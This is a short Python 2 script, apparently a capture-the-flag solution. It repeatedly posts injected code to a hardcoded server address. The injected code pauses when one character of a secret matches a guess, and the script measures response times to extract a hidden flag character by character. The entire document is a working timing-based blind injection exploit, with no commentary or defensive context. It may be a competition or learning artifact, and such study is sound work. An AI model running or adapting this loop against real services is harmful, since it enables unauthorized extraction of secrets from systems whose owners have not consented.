import requests
import time
import json

url = "http://35.207.189.79/wee/dev/null"
data_structure = """{{ "code": {} }}"""
data_content = """if charAt(DEV_NULL, {}) == '{}' then
   pause(4500)
end"""
chars = list("_1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")
response_time_target = 4.0

try:
   
   f = 0
   flag = ""
   fast_answers = 0
   while fast_answers < len(chars):

      best_char = " "
      best_response_time = 0.0
      fast_answers = 0

      for c in range(len(chars)):
         print "[*] Flag char number '{}', char '{}'.".format(f, chars[c])
         data_content_to_send = json.dumps(data_content.format(f, chars[c]))
         data_to_send = data_structure.format(data_content_to_send)
         print "[*] Payload: '{}'.".format(data_to_send)
         start = time.time()
         response = requests.post(url, data=data_to_send)
         end = time.time()
         print "[*] Response: '{}'.".format(response.text)
      
         response_time = end - start
         print "[*] Response time is '{}'.".format(response_time)
         if response_time >= response_time_target and response_time > best_response_time:
            best_response_time = response_time
            best_char = chars[c]
            print "[*] Found char '{}'.".format(best_char)
            break
         elif response_time < response_time_target:
            fast_answers+=1

      f+=1
      flag += str(best_char)
      print "[*] >>> Flag: '{}'. <<<".format(flag)

except KeyboardInterrupt:
   print "[-] Interrupted!"